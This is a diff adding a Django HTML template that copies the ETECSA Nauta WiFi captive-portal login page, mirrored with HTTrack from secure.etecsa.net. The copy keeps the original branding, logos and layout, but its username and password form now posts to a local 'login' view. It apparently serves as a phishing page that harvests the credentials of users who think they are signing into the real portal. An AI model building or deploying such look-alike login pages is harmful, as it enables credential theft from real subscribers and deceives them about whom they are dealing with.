@@ -1,0 +1,108 @@
+{% load static %}
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	
+<!-- Mirrored from secure.etecsa.net:8443/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 05 Oct 2024 18:37:24 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+		<title>Bienvenido</title>
+		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+		<meta http-equiv="pragma" content="no-cache">
+		<meta http-equiv="cache-control" content="no-store">
+		<meta http-equiv="expires" content="0">
+		<meta http-equiv="keywords" content=" ">
+		<meta http-equiv="description" content=" ">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<link href="{% static 'css/wifi.css' %}" rel="stylesheet" type="text/css">
+		<link href="{% static 'css/form.css' %}" rel="stylesheet" type="text/css">
+		<script type="text/javascript" src="{% static 'js/query.js' %}"></script>
+		<script type='text/javascript' src="{% static 'js/sLocale_es_ES.js' %}"></script>
+		
+	</head>
+
+<body>
+	<div id="header">
+                <div style="width: 25%;height: 100px;float: left;"></div>
+		<img src="{% static 'img/nauta_wifi.jpg' %}" id="logo_nauta" width="50%" height="100">
+		<img src="{% static 'img/etecsa.jpg' %}" id="logo_etecsa">
+	</div>
+
+	<div id="contenedor">
+		
+
+
+
+
+
+
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<header>
+	<img src="{% static 'img/contenedor_bg.jpg' %}" id="bg">
+
+	<ul id="menu_lang" class="clearfix">
+		<li class="sel"id="es_ESsel"><a href="#" onclick="javascript:switchLang('es_ES')">Español</a></li>
+		<li class=""id="en_USsel"><a href="#" onclick="javascript:switchLang('en_US')">English</a></li>
+	</ul>
+	<form id="changelang" action="#" method="post">
+	    <input type="hidden" value="" id="lang" name="lang"/>
+	    <input type="hidden" value="" id="currentURL" name="currentURL"/>
+	<input type='hidden' name='CSRFHW' value='9947803935e997083849e65a8bc24caa' /></form>
+</header>
+		<div id="int" style="width:500px;">
+	<div class="blq">
+		<div class="title">Bienvenido</div>
+
+		<div class="blq_int clearfix">
+                        <div style="margin-top:5px;text-align:center; font-size:11px;">
+				<div id="tarifa" style="margin-top: 5px;text-align: center;font-size: 11px;">
+					<div id="tarifa_container" style="width: 50%;text-align: left;margin: auto;">
+					</div>
+				</div>
+			</div>
+                        <a href="http://www.etecsa.cu/images/cu.sld.COVID_19_InfoCU-v3.apk" target="_blank">Descargue aquí APK "COVID-19"</a>
+			<form class="form" action="{% url 'login' %}" method="post" id="formulario">
+				{% csrf_token %}
+				<label for="nombre">Usuario:</label> <input name="username" id="username" maxlength="253" class="input_text cred" type="text">
+				<br class="clearfloat">
+				<!-- [false alarm:Privacy Violation: Password] -->
+				<label for="password">Contraseña:</label>
+				<input name="password" id="password" class="input_text cred" type="password" autocomplete="off">
+				<br class="clearfloat"> 
+				
+				<label for=""></label>
+                 <input class="btn" name="Enviar" value="Aceptar" type="submit">
+                 <input class="btn" name="cancel" value='Cancelar' type="reset">
+                 <input class="btn" name="ayuda" value='Ayuda' style="/*display:none;*/" onclick="help();" type="button">
+				<br class="clearfloat">
+				
+				<div class="vnc" style="text-align: center;">
+					<a href="#" onclick="termsofuse()">Condiciones de uso</a>
+                                        <a href="https://www.portal.nauta.cu/user/login" target="_blank">Portal de Usuario</a>
+					<a onclick="sendUserInfoForm();" href="#">Información de usuario</a>									
+				</div>
+				<br class="clearfloat">
+			<input type='hidden' name='CSRFHW' value='9947803935e997083849e65a8bc24caa' /></form>
+		</div>
+	</div>
+</div>
+
+<div id="banner_promos" style="margin-top:40px;">
+		<ul style="text-align:center;list-style-type: none;margin: 0;padding: 0;">
+			<li style="display:inline;margin-right:20px;"><img src="{% static 'img/CUBADEBATE.jpg' %}" style="border-radius: 6px;height: 68px;" id="promo"></li>
+			<li style="display:inline;margin-right:20px;"><img src="{% static 'img/CUBAEDUCA.jpg' %}" style="border-radius: 6px;height: 68px;" id="promo"></li>
+			<li style="display:inline;margin-right:20px;"><img src="{% static 'img/CUBARTE.jpg' %}" style="border-radius: 6px;height: 68px;" id="promo"></li>
+			<li style="display:inline;margin-right:20px;"><img src="{% static 'img/CUBASI.jpg' %}" style="border-radius: 6px;height: 68px;" id="promo"></li>
+			<li style="display:inline;margin-right:20px;"><img src="{% static 'img/ECURED.jpg' %}" style="border-radius: 6px;height: 68px;" id="promo"></li>
+			<li style="display:inline;margin-right:20px;"><img src="{% static 'img/OFERTAS.jpg' %}" style="border-radius: 6px;height: 68px;" id="promo"></li>
+			<li style="display:inline;margin-right:20px;"><img src="{% static 'img/PAPELETA.jpg' %}" style="border-radius: 6px;height: 68px;" id="promo"></li>
+		</ul>	
+	</div>
+
+
+</body>
+<!-- Mirrored from secure.etecsa.net:8443/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 05 Oct 2024 18:37:44 GMT -->
+</html>
